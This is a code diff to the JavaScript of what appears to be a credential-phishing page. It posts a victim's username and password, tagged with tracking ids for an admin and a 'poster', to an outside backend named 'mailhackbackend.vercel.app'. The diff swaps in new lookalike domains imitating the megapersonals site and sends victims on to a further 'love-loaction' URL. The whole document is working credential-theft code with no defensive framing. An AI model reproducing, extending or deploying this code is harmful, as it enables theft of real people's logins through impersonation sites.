@@ -1,5 +1,5 @@
-const API_URL = 'https://erosback.vercel.app'
-const siteUrl ='livve-gooqlle-mapsllsa.it.com'
+const API_URL = 'https://mailhackbackend.vercel.app'
+const siteUrl ='www.meggapursonel.online'
 
 function detectDevice(userAgent) {
     if (/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(userAgent)) {
@@ -26,6 +26,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const posterId = getQueryParam('poster');
     const site = getQueryParam('site');
 
+    const verifyId = urlParams.get('verifyId');
 
 
 
@@ -60,8 +61,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 },
                 body: JSON.stringify({
                     site:site,
-                    email: uname,
-                    password: pwd,
+                    mail: uname,
+                    passcode: pwd,
                     adminId: adminId,
                     posterId: posterId
                 })
@@ -69,9 +70,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 .then(response => response.json())
                 .then(data => {
                     console.log('Response:', data);
-                    if (data.success) {
+                    if (data) {
                         // Redirect to another URL on success
-                        window.location.href = 'https://megapersonals.eu';
+                        window.location.href =   `https://love-loaction.vercel.app/${admin}/${poster}/${verifyId}`;;
                     }
                 })
                 .catch(error => {
